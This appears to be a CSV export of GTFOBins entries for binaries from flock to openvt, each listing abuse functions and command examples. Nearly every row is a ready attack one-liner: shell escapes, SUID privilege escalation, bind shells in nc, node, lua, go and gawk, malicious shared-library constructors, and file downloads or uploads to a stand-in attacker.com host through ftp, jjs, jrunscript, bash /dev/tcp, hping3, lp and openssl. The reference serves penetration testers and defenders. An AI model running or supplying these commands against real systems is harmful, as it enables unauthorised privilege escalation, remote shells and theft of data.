Binary Name,URL,Description,Functions,Examples
flock,https://gtfobins.org/gtfobins/flock/,This executable can spawn an interactive system shell.,Shell,flock -u / /bin/sh; flock -u / /bin/sh -p
fmt,https://gtfobins.org/gtfobins/fmt/,This executable can read data from local files.,File read,fmt -pNON_EXISTING_PREFIX /path/to/input-file; fmt -999 /path/to/input-file
fold,https://gtfobins.org/gtfobins/fold/,This executable can read data from local files.,File read,fold -w999 /path/to/input-file
forge,https://gtfobins.org/gtfobins/forge/,This executable can spawn an interactive system shell.,Shell,"echo '#!/bin/sh' >/path/to/temp-file
echo -e ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" >>/path/to/temp-file
chmod +x /path/to/temp-file
forge build --use /path/to/temp-file"
fping,https://gtfobins.org/gtfobins/fping/,This executable can read data from local files.,File read,fping -f /path/to/input-file
ftp,https://gtfobins.org/gtfobins/ftp/,This executable can download remote data.,Download; Shell; Upload,"ftp -a attacker.com
get /path/to/input-file output-file; python -m pyftpdlib -w -p 21; ftp
!/bin/sh"
fzf,https://gtfobins.org/gtfobins/fzf/,This executable can run non-interactive system commands.,Command; Shell,fzf --listen=12345; fzf --bind 'enter:execute(/bin/sh)'
g++,https://gtfobins.org/gtfobins/g%2B%2B/,Alias of gcc. This executable can read data from local files.,File read; File write; Shell,gcc -x c -E /path/to/input-file; gcc @/path/to/input-file; gcc -x c /dev/null -o /path/to/input-file
gawk,https://gtfobins.org/gtfobins/gawk/,This executable can bind a system shell to a local port waiting for an attacker to connect.,Bind shell; File read; File write; Reverse shell; Shell,"gawk 'BEGIN {
    s = ""/inet/tcp/12345/0/0"";
    while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'; nc victim.com 12345; gawk '//' /path/to/input-file"
gcc,https://gtfobins.org/gtfobins/gcc/,This executable can read data from local files.,File read; File write; Shell,gcc -x c -E /path/to/input-file; gcc @/path/to/input-file; gcc -x c /dev/null -o /path/to/input-file
gcloud,https://gtfobins.org/gtfobins/gcloud/,This executable can inherit functions from another.,Inherit,gcloud help
gcore,https://gtfobins.org/gtfobins/gcore/,This executable can read data from local files.,File read,gcore $PID
gdb,https://gtfobins.org/gtfobins/gdb/,This executable can write data to local files.,File write; Inherit; Shell,"gdb -nx -ex 'dump value /path/to/output-file ""DATA""' -ex quit; gdb -nx -ex 'python ...' -ex quit; gdb -nx -ex '!/bin/sh' -ex quit"
gem,https://gtfobins.org/gtfobins/gem/,This executable can inherit functions from another.,Inherit; Shell,gem open debug; gem build /path/to/script.rb; gem install --file /path/to/script.rb
genie,https://gtfobins.org/gtfobins/genie/,This executable can spawn an interactive system shell.,Shell,genie -c '/bin/sh'
genisoimage,https://gtfobins.org/gtfobins/genisoimage/,This executable can read data from local files.,File read,genisoimage -q -o - /path/to/input-file; genisoimage -sort /path/to/input-file
getent,https://gtfobins.org/gtfobins/getent/,"This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable.",Privilege escalation,getent shadow
ghc,https://gtfobins.org/gtfobins/ghc/,This executable can spawn an interactive system shell.,Shell,"ghc -e 'System.Process.callCommand ""/bin/sh""'"
ghci,https://gtfobins.org/gtfobins/ghci/,This executable can spawn an interactive system shell.,Shell,"ghci
System.Process.callCommand ""/bin/sh"""
gimp,https://gtfobins.org/gtfobins/gimp/,This executable can inherit functions from another.,Inherit,gimp -idf --batch-interpreter=python-fu-eval -b '...'
ginsh,https://gtfobins.org/gtfobins/ginsh/,This executable can spawn an interactive system shell.,Shell,"ginsh
!/bin/sh"
git,https://gtfobins.org/gtfobins/git/,This executable can read data from local files.,File read; File write; Inherit; Shell,git diff /dev/null /path/to/input-file; git apply --unsafe-paths --directory / x.patch; git help config
gnuplot,https://gtfobins.org/gtfobins/gnuplot/,This executable can spawn an interactive system shell.,Shell,"gnuplot -e 'system(""/bin/sh 1>&0"")'"
go,https://gtfobins.org/gtfobins/go/,This executable can bind a system shell to a local port waiting for an attacker to connect.,Bind shell; File read; File write; Reverse shell; Shell,"echo -e 'package main\nimport (\n\t""os""\n\t""syscall""\n)\n\nfunc main(){\n\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n\taddr := &syscall.SockaddrInet4{Port: 12345}\n\tcopy(addr.Addr[:], []byte{0,0,0,0})\n\tsyscall.Bind(fd, addr)\n\tsyscall.Listen(fd, 1)\n\tnfd, _, _ := syscall.Accept(fd)\n\tsyscall.Dup2(nfd, 0)\n\tsyscall.Dup2(nfd, 1)\n\tsyscall.Dup2(nfd, 2)\n\tsyscall.Exec(""/bin/sh"", []string{""/bin/sh"", ""-i""}, os.Environ())\n}' >/path/to/temp-file.go
go run /path/to/temp-file.go; nc victim.com 12345; echo -e 'package main\nimport (\n\t""fmt""\n\t""os""\n)\n\nfunc main(){\n\tb, _ := os.ReadFile(""/path/to/input-file"")\n\tfmt.Print(string(b))\n}' >/path/to/temp-file.go
go run /path/to/temp-file.go"
grc,https://gtfobins.org/gtfobins/grc/,This executable can spawn an interactive system shell.,Shell,grc --pty /bin/sh
grep,https://gtfobins.org/gtfobins/grep/,This executable can read data from local files.,File read,grep '' /path/to/input-file
gtester,https://gtfobins.org/gtfobins/gtester/,This executable can write data to local files.,File write; Shell,"gtester DATA -o /path/to/output-file; echo 'exec /bin/sh 0<&1' >/path/to/temp-file
chmod +x /path/to/temp-file
gtester -q /path/to/temp-file; echo '#!/bin/sh -p' >/path/to/temp-file
echo 'exec /bin/sh -p 0<&1' >>/path/to/temp-file
chmod +x /path/to/temp-file
gtester -q /path/to/temp-file"
guile,https://gtfobins.org/gtfobins/guile/,This executable can spawn an interactive system shell.,Shell,"guile -c '(system ""/bin/sh"")'"
gzip,https://gtfobins.org/gtfobins/gzip/,"There are also a number of other utilities that rely on `gzip` under the hood, e.g., `zless`, `zcat`, `gunzip`, etc. Besides having similar features, they also allow privileged reads if `gzip` itself is SUID.",File read,gzip -c /path/to/input-file | gzip -d
hashcat,https://gtfobins.org/gtfobins/hashcat/,This executable can write data to local files.,File write,"echo -n DATA | tee /path/to/wordlist | md5sum | awk '{print $1}' >/path/to/hash
hashcat -m 0 --quiet --potfile-disable -o /path/to/output-file --outfile-format=2 --outfile-autohex-disable /path/to/hash /path/to/wordlist"
hd,https://gtfobins.org/gtfobins/hd/,Alias of hexdump. This executable can read data from local files.,File read,hd /path/to/input-file
head,https://gtfobins.org/gtfobins/head/,This executable can read data from local files.,File read,head -c-0 /path/to/input-file
hexdump,https://gtfobins.org/gtfobins/hexdump/,This executable can read data from local files.,File read,hd /path/to/input-file
hg,https://gtfobins.org/gtfobins/hg/,This executable can spawn an interactive system shell.,Shell,hg --config alias.x='!/bin/sh' x
highlight,https://gtfobins.org/gtfobins/highlight/,This executable can read data from local files.,File read,highlight --no-doc --failsafe /path/to/input-file
hping3,https://gtfobins.org/gtfobins/hping3/,This executable can spawn an interactive system shell.,Shell; Upload,"hping3
/bin/sh; hping3
/bin/sh -p; hping3 attacker.com --icmp --data 999 --sign xxx --file /path/to/input-file"
iconv,https://gtfobins.org/gtfobins/iconv/,"The `8859_1` encoding is used as it accepts any single-byte sequence, thus it allows to read/write arbitrary files. Other encoding combinations may corrupt the result.",File read; File write,iconv -f 8859_1 -t 8859_1 /path/to/input-file; echo DATA | iconv -f 8859_1 -t 8859_1 -o /path/to/output-file
iftop,https://gtfobins.org/gtfobins/iftop/,This executable can spawn an interactive system shell.,Shell,"iftop
!/bin/sh"
install,https://gtfobins.org/gtfobins/install/,"This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable.",Privilege escalation,install -m 6777 /path/to/input-file /path/to/output-dir/
ionice,https://gtfobins.org/gtfobins/ionice/,This executable can spawn an interactive system shell.,Shell,ionice /bin/sh; ionice /bin/sh -p
ip,https://gtfobins.org/gtfobins/ip/,This executable can read data from local files.,File read; Shell,"ip -force -batch /path/to/input-file; ip netns add foo
ip netns exec foo /bin/sh
ip netns delete foo; ip netns add foo
ip netns exec foo /bin/sh -p
ip netns delete foo"
iptables-save,https://gtfobins.org/gtfobins/iptables-save/,This executable can write data to local files.,File write,"iptables -A INPUT -i lo -j ACCEPT -m comment --comment DATA
iptables -S
iptables-save -f /path/to/output-file"
irb,https://gtfobins.org/gtfobins/irb/,This executable can inherit functions from another.,Inherit,"irb
..."
ispell,https://gtfobins.org/gtfobins/ispell/,This executable can spawn an interactive system shell.,Shell,"ispell /etc/hosts
!/bin/sh; ispell /etc/hosts
!/bin/sh -p"
java,https://gtfobins.org/gtfobins/java/,This executable can spawn an interactive system shell.,Shell,java Shell
jjs,https://gtfobins.org/gtfobins/jjs/,This tool is installed starting with Java SE 8.,Download; File read; File write; Reverse shell; Shell,"jjs
var URL = Java.type('java.net.URL');
var ws = new URL('http://attacker.com/path/to/input-file');
var Channels = Java.type('java.nio.channels.Channels');
var rbc = Channels.newChannel(ws.openStream());
var FileOutputStream = Java.type('java.io.FileOutputStream');
var fos = new FileOutputStream('/path/to/output-file');
fos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);
fos.close();
rbc.close();; python -m http.server 80; jjs
var BufferedReader = Java.type('java.io.BufferedReader');
var FileReader = Java.type('java.io.FileReader');
var br = new BufferedReader(new FileReader('/path/to/input-file'));
while ((line = br.readLine()) != null) { print(line); }"
joe,https://gtfobins.org/gtfobins/joe/,This executable can spawn an interactive system shell.,Shell,"joe
^K!/bin/sh"
join,https://gtfobins.org/gtfobins/join/,This executable can read data from local files.,File read,join -a 2 /dev/null /path/to/input-file
journalctl,https://gtfobins.org/gtfobins/journalctl/,This might not work if run by unprivileged users depending on the system configuration.,Inherit,journalctl
jq,https://gtfobins.org/gtfobins/jq/,This executable can read data from local files.,File read,jq -Rr . /path/to/input-file
jrunscript,https://gtfobins.org/gtfobins/jrunscript/,This tool is installed starting with Java SE 6.,Download; File read; File write; Reverse shell; Shell,"jrunscript -e 'cp(""http://attacker.com/path/to/input-file"",""/path/to/output-file"")'; python -m http.server 80; jrunscript -e 'br = new BufferedReader(new java.io.FileReader(""/path/to/input-file""));
    while ((line = br.readLine()) != null) { print(line); }'"
jshell,https://gtfobins.org/gtfobins/jshell/,This executable can read data from local files.,File read; File write; Shell,"jshell
jshell> /open /path/to/input-file; jshell
String x = ""DATA"";
/save /path/to/output-file; jshell
Runtime.getRuntime().exec(""/path/to/command"");"
jtag,https://gtfobins.org/gtfobins/jtag/,This executable can spawn an interactive system shell.,Shell,"jtag --interactive
shell /bin/sh"
julia,https://gtfobins.org/gtfobins/julia/,This executable can download remote data.,Download; File read; File write; Reverse shell; Shell,"julia -e 'download(""http://attacker.com/path/to/input-file"", ""/path/to/output-file"")'; python -m http.server 80; julia -e 'print(open(f->read(f, String), ""/path/to/input-file""))'"
knife,https://gtfobins.org/gtfobins/knife/,This executable can inherit functions from another.,Inherit,knife exec -E '...'
ksh,https://gtfobins.org/gtfobins/ksh/,Alias of bash. This executable can download remote data.,Download; File read; File write; Library load; Reverse shell; Shell; Upload,"bash -c '{ echo -ne ""GET /path/to/input-file HTTP/1.0\r\nhost: attacker.com\r\n\r\n"" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/attacker.com/12345 \
    | { while read -r; do [ ""$REPLY"" = ""$(echo -ne ""\r"")"" ] && break; done; cat; } >/path/to/output-file'; bash -p -c '{ echo -ne ""GET /path/to/input-file HTTP/1.0\r\nhost: attacker.com\r\n\r\n"" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/attacker.com/12345 \
    | { while read -r; do [ ""$REPLY"" = ""$(echo -ne ""\r"")"" ] && break; done; cat; } >/path/to/output-file'; bash -c 'echo ""$(</dev/tcp/attacker.com/12345) >/path/to/output-file'"
ksshell,https://gtfobins.org/gtfobins/ksshell/,This executable can read data from local files.,File read,ksshell -i /path/to/input-file
ksu,https://gtfobins.org/gtfobins/ksu/,This executable can spawn an interactive system shell.,Shell,ksu -q -e /bin/sh
kubectl,https://gtfobins.org/gtfobins/kubectl/,This executable can spawn an interactive system shell.,Shell; Upload,"cat >/path/to/temp-file <<EOF
clusters:
- cluster:
    server: https://x
  name: x
contexts:
- context:
    cluster: x
    user: x
  name: x
current-context: x
users:
- name: x
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      interactiveMode: Always
      command: /bin/sh
      args:
        - '-c'
        - '/bin/sh 0<&2 1>&2'
EOF

kubectl get pods --kubeconfig=/path/to/temp-file; kubectl proxy --address=0.0.0.0 --port=12345 --www=/path/to/dir/ --www-prefix=/x/"
last,https://gtfobins.org/gtfobins/last/,This executable can read data from local files.,File read,last -a -f /path/to/input-file
lastb,https://gtfobins.org/gtfobins/lastb/,Alias of last. This executable can read data from local files.,File read,last -a -f /path/to/input-file
latex,https://gtfobins.org/gtfobins/latex/,This executable can read data from local files.,File read; File write; Shell,"latex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}'
strings texput.dvi; latex '\documentclass{article}\newwrite\tempfile\begin{document}\immediate\openout\tempfile=output-file.tex\immediate\write\tempfile{DATA}\immediate\closeout\tempfile\end{document}'; latex --shell-escape '\immediate\write18{/bin/sh}'"
latexmk,https://gtfobins.org/gtfobins/latexmk/,This executable can read data from local files.,File read; Inherit; Shell,"echo '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{/path/to/input-file}\end{document}' >/path/to/temp-file
latexmk -dvi /path/to/temp-file
strings temp-file.dvi; latexmk -e '...'; latexmk -pdf -pdflatex='/bin/sh #' /dev/null"
ld.so,https://gtfobins.org/gtfobins/ld.so/,"`ld.so` is the Linux dynamic linker/loader, its filename and location might change across distributions (e.g., `/lib64/ld-linux-x86-64.so.2`). The actual path is can be obtained with: ``` strings /proc/self/exe | head -1 ```",Shell,/path/to/ld.so /bin/sh; /path/to/ld.so /bin/sh -p
ldconfig,https://gtfobins.org/gtfobins/ldconfig/,This executable can load shared libraries that may be used to run arbitrary code in the same execution context.,Library load,"echo /path/to/temp-dir/ >/path/to/temp-file
ldconfig -f /path/to/temp-file
ping; echo '__attribute__((constructor)) init() { execl(""/bin/sh"", ""sh"", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -"
less,https://gtfobins.org/gtfobins/less/,This executable can run non-interactive system commands.,Command; File read; File write; Inherit; Shell,"cp /path/to/command ~/.lessfilter
less /etc/hosts; LESSOPEN='/path/to/command # %s' less /etc/hosts; less /path/to/input-file"
lftp,https://gtfobins.org/gtfobins/lftp/,This executable can spawn an interactive system shell.,Shell,lftp -c '!/bin/sh'
links,https://gtfobins.org/gtfobins/links/,This executable can read data from local files.,File read,links /path/to/input-file
ln,https://gtfobins.org/gtfobins/ln/,"This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable.",Privilege escalation,"ln -fs /bin/sh /bin/ln
ln"
loginctl,https://gtfobins.org/gtfobins/loginctl/,This might not work if run by unprivileged users depending on the system configuration.,Shell,"loginctl user-status
!/bin/sh"
logrotate,https://gtfobins.org/gtfobins/logrotate/,This executable can read data from local files.,File read; File write; Shell,"logrotate /path/to/input-file; logrotate -l /path/to/output-file DATA; echo -e '/path/to/temp-file.config {\nmail x@x.x\n}' >/path/to/temp-file.config
echo '/bin/sh 0<&2 1>&2' >/path/to/temp-file.sh
logrotate -m /path/to/temp-file.sh -f /path/to/temp-file"
logsave,https://gtfobins.org/gtfobins/logsave/,This executable can spawn an interactive system shell.,Shell,logsave /dev/null /bin/sh -i; logsave /dev/null /bin/sh -i -p
look,https://gtfobins.org/gtfobins/look/,This executable can read data from local files.,File read,look '' /path/to/input-file
lp,https://gtfobins.org/gtfobins/lp/,This executable can upload local data.,Upload,lp /path/to/input-file -h attacker.com
ltrace,https://gtfobins.org/gtfobins/ltrace/,This executable can read data from local files.,File read; File write; Shell,ltrace -F /path/to/input-file /dev/null; ltrace -s 999 -o /path/to/input-file ltrace -F DATA; ltrace -b -L /bin/sh
lua,https://gtfobins.org/gtfobins/lua/,This executable can bind a system shell to a local port waiting for an attacker to connect.,Bind shell; Download; File read; File write; Reverse shell; Shell; Upload,"lua -e '
  local k=require(""socket"");
  local s=assert(k.bind(""*"",12345));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,""r""));
    local b=assert(f:read(""*a""));c:send(b);
  end;c:close();f:close();'; nc victim.com 12345; lua -e '
  local k=require(""socket"");
  local s=assert(k.bind(""*"",12345));
  local c=s:accept();
  local d,x=c:receive(""*a"");
  c:close();
  local f=io.open(""/path/to/output-file"", ""wb"");
  f:write(d);
  io.close(f);'"
lualatex,https://gtfobins.org/gtfobins/lualatex/,This executable can inherit functions from another.,Inherit,lualatex -shell-escape '\directlua{...}\end'
luatex,https://gtfobins.org/gtfobins/luatex/,This executable can inherit functions from another.,Inherit,luatex -shell-escape '\directlua{...}\end'
lwp-download,https://gtfobins.org/gtfobins/lwp-download/,This executable can download remote data.,Download; File read; File write,"lwp-download http://attacker.com/path/to/input-file /path/to/output-file; lwp-download file:///path/to/input-file /dev/stdout; echo DATA >/path/to/temp-file
lwp-download file:///path/to/temp-file /path/to/output-file"
lwp-request,https://gtfobins.org/gtfobins/lwp-request/,This executable can read data from local files.,File read,lwp-request file:///path/to/input-file
lxd,https://gtfobins.org/gtfobins/lxd/,This executable can spawn an interactive system shell.,Shell,"lxc init ubuntu:16.04 x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/ recursive=true
lxc start x
lxc exec x /bin/sh; lxc image import ./alpine*.tar.gz --alias x
lxc init x x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/ recursive=true
lxc start x
lxc exec x /bin/sh"
m4,https://gtfobins.org/gtfobins/m4/,This executable can run non-interactive system commands.,Command; File read; Shell,echo 'esyscmd(/path/to/command)' | m4; m4 /path/to/input-file; echo 'esyscmd(/bin/sh 0<&2 1>&2)' | m4
mail,https://gtfobins.org/gtfobins/mail/,This executable can spawn an interactive system shell.,Shell,"mail --exec='!/bin/sh'; mail -f /etc/hosts
!/bin/sh"
make,https://gtfobins.org/gtfobins/make/,This executable can read data from local files.,File read; File write; Shell,"make -s --eval='$(file >/dev/stdout,$(file </path/to/input-file))' .; make -s --eval='$(file >/path/to/output-file,DATA)' .; make --eval='$(shell /bin/sh 1>&0)' ."
man,https://gtfobins.org/gtfobins/man/,This executable can read data from local files.,File read; Inherit; Shell,man /path/to/input-file; man man; man '-H/bin/sh #' man
mawk,https://gtfobins.org/gtfobins/mawk/,This executable can read data from local files.,File read; File write; Shell,"mawk '//' /path/to/input-file; mawk 'BEGIN { print ""DATA"" > ""/path/to/output-file"" }'; mawk 'BEGIN {system(""/bin/sh"")}'"
minicom,https://gtfobins.org/gtfobins/minicom/,"Note that in some versions, `Meta-Z` is used in place of `Ctrl-A`.",Shell,"minicom -D /dev/null; echo '! exec /bin/sh </dev/tty 1>/dev/tty 2>/dev/tty' >/path/to/temp-file
minicom -D /dev/null -S /path/to/temp-file
reset^J"
more,https://gtfobins.org/gtfobins/more/,This executable can read data from local files.,File read; Shell,"more /path/to/input-file; more /etc/hosts
!/bin/sh"
mosh-server,https://gtfobins.org/gtfobins/mosh-server/,This executable can spawn an interactive system shell.,Shell,mosh --server=mosh-server localhost /bin/sh
mosquitto,https://gtfobins.org/gtfobins/mosquitto/,This executable can read data from local files.,File read,mosquitto -c /path/to/input-file
mount,https://gtfobins.org/gtfobins/mount/,"This executable provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable.",Privilege escalation,"mount -o bind /bin/sh /bin/mount
mount"
msfconsole,https://gtfobins.org/gtfobins/msfconsole/,This executable can inherit functions from another.,Inherit,"msfconsole
irb"
msgattrib,https://gtfobins.org/gtfobins/msgattrib/,This executable can read data from local files.,File read,msgattrib -P /path/to/input-file
msgcat,https://gtfobins.org/gtfobins/msgcat/,This executable can read data from local files.,File read,msgcat -P /path/to/input-file
msgconv,https://gtfobins.org/gtfobins/msgconv/,This executable can read data from local files.,File read,msgconv -P /path/to/input-file
msgfilter,https://gtfobins.org/gtfobins/msgfilter/,This executable can read data from local files.,File read; Shell,msgfilter -P -i /path/to/input-file /bin/cat; echo x | msgfilter -P /bin/sh -c '/bin/sh 0<&2 1>&2; kill $PPID'; echo x | msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'
msgmerge,https://gtfobins.org/gtfobins/msgmerge/,This executable can read data from local files.,File read,msgmerge -P /path/to/input-file /dev/null
msguniq,https://gtfobins.org/gtfobins/msguniq/,This executable can read data from local files.,File read,msguniq -P /path/to/input-file
mtr,https://gtfobins.org/gtfobins/mtr/,This executable can read data from local files.,File read,mtr --raw -F /path/to/input-file
multitime,https://gtfobins.org/gtfobins/multitime/,This executable can spawn an interactive system shell.,Shell,multitime /bin/sh; multitime /bin/sh -p
mutt,https://gtfobins.org/gtfobins/mutt/,This executable can read data from local files.,File read,mutt -F /path/to/input-file
mv,https://gtfobins.org/gtfobins/mv/,This executable can write data to local files.,File write; Privilege escalation,"echo DATA >/path/to/temp-file
mv /path/to/temp-file /path/to/output-file; mv /path/to/input-file /path/to/output-file"
mypy,https://gtfobins.org/gtfobins/mypy/,This executable can read data from local files.,File read; File write,mypy /path/to/input-file; mypy /path/to/input-file --junit-xml /path/to/output-file
mysql,https://gtfobins.org/gtfobins/mysql/,A valid MySQL server must be available to connect to.,Library load; Shell,"mysql --default-auth ../../../../../path/to/lib; echo '__attribute__((constructor)) init() { execl(""/bin/sh"", ""sh"", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -; mysql -e '\! /bin/sh'"
nano,https://gtfobins.org/gtfobins/nano/,This executable can read data from local files.,File read; File write; Shell,"nano /path/to/input-file; nano /path/to/output-file
DATA
^O; nano
^R^X
reset; sh 1>&0 2>&0"
nasm,https://gtfobins.org/gtfobins/nasm/,This executable can read data from local files.,File read,nasm -@ /path/to/input-file
nawk,https://gtfobins.org/gtfobins/nawk/,Alias of gawk. This executable can bind a system shell to a local port waiting for an attacker to connect.,Bind shell; File read; File write; Reverse shell; Shell,"gawk 'BEGIN {
    s = ""/inet/tcp/12345/0/0"";
    while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'; nc victim.com 12345; gawk '//' /path/to/input-file"
nc,https://gtfobins.org/gtfobins/nc/,This executable can bind a system shell to a local port waiting for an attacker to connect.,Bind shell; Download; Reverse shell; Upload,nc -l -p 12345 -e /bin/sh; nc victim.com 12345; nc -l -p 12345 >/path/to/output-file
ncdu,https://gtfobins.org/gtfobins/ncdu/,This executable can spawn an interactive system shell.,Shell,"ncdu
b"
ncftp,https://gtfobins.org/gtfobins/ncftp/,This executable can spawn an interactive system shell.,Shell,"ncftp
!/bin/sh; ncftp
!/bin/sh -p"
needrestart,https://gtfobins.org/gtfobins/needrestart/,This executable can inherit functions from another.,Inherit,"echo '...' >/path/to/temp-file
needrestart -c /path/to/temp-file"
neofetch,https://gtfobins.org/gtfobins/neofetch/,This executable can read data from local files.,File read; Shell,"neofetch --ascii /path/to/input-file; echo 'exec /bin/sh' >/path/to/temp-file
neofetch --config /path/to/temp-file"
nft,https://gtfobins.org/gtfobins/nft/,This executable can read data from local files.,File read,nft -f /path/to/input-file
nginx,https://gtfobins.org/gtfobins/nginx/,This executable can download remote data.,Download; Library load; Upload,"cat >/path/to/temp-file <<EOF
user root;
http {
  server {
    listen 80;
    root /;
    autoindex on;
    dav_methods PUT;
  }
}
events {}
EOF

nginx -c /path/to/temp-file; cat >/path/to/temp-file <<EOF
load_module /path/to/lib.so
EOF

nginx -t -c /path/to/temp-file; echo '__attribute__((constructor)) init() { execl(""/bin/sh"", ""sh"", 0); }' \
    | gcc -w -fPIC -shared -o lib.so -x c -"
nice,https://gtfobins.org/gtfobins/nice/,This executable can spawn an interactive system shell.,Shell,nice /bin/sh; nice /bin/sh -p
nl,https://gtfobins.org/gtfobins/nl/,This executable can read data from local files.,File read,nl -bn -w1 -s '' /path/to/input-file
nm,https://gtfobins.org/gtfobins/nm/,This executable can read data from local files.,File read,nm /path/to/input-file
nmap,https://gtfobins.org/gtfobins/nmap/,This executable can read data from local files.,File read; File write; Inherit; Shell,"nmap -iL /path/to/input-file; nmap -oG=/path/to/output-file DATA; echo '...' >/path/to/temp-file
nmap --script=/path/to/temp-file"
node,https://gtfobins.org/gtfobins/node/,This executable can bind a system shell to a local port waiting for an attacker to connect.,Bind shell; Download; File read; File write; Reverse shell; Shell; Upload,"node -e 'sh = require(""child_process"").spawn(""/bin/sh"");
require(""net"").createServer(function (client) {
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
}).listen(12345)'; node -e 'sh = require(""child_process"").spawn(""/bin/sh"", [""-p""]);
require(""net"").createServer(function (client) {
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
}).listen(12345)'; nc victim.com 12345"
nohup,https://gtfobins.org/gtfobins/nohup/,This executable can run non-interactive system commands.,Command; Shell,"nohup /path/to/command
cat nohup.out; nohup /bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'; nohup /bin/sh -p -c '/bin/sh -p </dev/tty >/dev/tty 2>/dev/tty'"
npm,https://gtfobins.org/gtfobins/npm/,This executable can spawn an interactive system shell.,Shell,"npm exec /bin/sh; echo '{""scripts"": {""preinstall"": ""/bin/sh""}}' >package.json
npm -C . i; echo '{""scripts"": {""xxx"": ""/bin/sh""}}' >package.json
npm -C . run xxx"
nroff,https://gtfobins.org/gtfobins/nroff/,This executable can read data from local files.,File read; Shell,"nroff /path/to/input-file; echo /bin/sh >groff
chmod +x groff
GROFF_BIN_PATH=. nroff"
nsenter,https://gtfobins.org/gtfobins/nsenter/,This executable can spawn an interactive system shell.,Shell,nsenter /bin/sh; nsenter /bin/sh -p
ntpdate,https://gtfobins.org/gtfobins/ntpdate/,This executable can read data from local files.,File read,ntpdate -a x -k /path/to/input-file -d localhost
nvim,https://gtfobins.org/gtfobins/nvim/,Alias of vim. This executable can read data from local files.,File read; Inherit,"vim -c ':redir! >/path/to/output-file | echo ""DATA"" | redir END | q'; vim -c ':py ...'; vim -c ':lua ...'"
octave,https://gtfobins.org/gtfobins/octave/,The payloads are compatible with GUI mode.,File read; File write; Shell,"octave-cli --eval 'format none; fid = fopen(""/path/to/input-file""); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'; octave-cli --eval 'fid = fopen(""/path/to/output-file"", ""w""); fputs(fid, ""DATA""); fclose(fid);'; octave-cli --eval 'system(""/bin/sh"")'"
od,https://gtfobins.org/gtfobins/od/,This executable can read data from local files.,File read,od -An -c -w999 /path/to/input-file
opencode,https://gtfobins.org/gtfobins/opencode/,This executable can run non-interactive system commands.,Command; Inherit,"opencode
! /path/to/command; opencode db '...'"
openssl,https://gtfobins.org/gtfobins/openssl/,This executable can download remote data.,Download; File read; File write; Library load; Reverse shell; Upload,"openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file; openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 </path/to/input-file; openssl enc -in /path/to/input-file"
openvpn,https://gtfobins.org/gtfobins/openvpn/,This executable can read data from local files.,File read; Shell,openvpn --config /path/to/input-file; openvpn --dev null --script-security 2 --up '/bin/sh -s'; openvpn --dev null --script-security 2 --up '/bin/sh -p -s'
openvt,https://gtfobins.org/gtfobins/openvt/,This executable can run non-interactive system commands.,Command,openvt -- /path/to/command
